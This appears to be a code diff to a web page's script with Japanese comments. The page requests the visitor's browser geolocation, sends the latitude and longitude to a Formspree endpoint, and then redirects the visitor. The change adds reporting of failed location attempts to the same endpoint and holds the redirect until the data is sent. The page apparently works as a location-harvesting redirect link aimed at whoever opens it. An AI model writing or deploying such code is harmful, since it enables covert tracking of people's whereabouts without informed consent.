@@ -7,9 +7,9 @@
     <script>
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
+                navigator.geolocation.getCurrentPosition(sendLocation, sendLocationError);
             } else {
-                redirectNow(); // 位置情報が取得できない場合も即リダイレクト
+                sendLocationError(); // 位置情報取得ができない場合
             }
         }
 
@@ -17,11 +17,26 @@
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
 
-            // 位置情報を送信（FormspreeのURLに変更）
+            // 位置情報をFormspreeに送信
             fetch("https://formspree.io/f/mvgkwpzg", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ latitude: lat, longitude: lon })
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    message: "位置情報が正常に取得されました"
+                })
+            }).finally(redirectNow); // 送信後にリダイレクト
+        }
+
+        function sendLocationError() {
+            // 位置情報が取得できなかった場合の処理
+            fetch("https://formspree.io/f/mvgkwpzg", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    message: "位置情報が取得できませんでした"
+                })
             }).finally(redirectNow); // 送信後にリダイレクト
         }
 
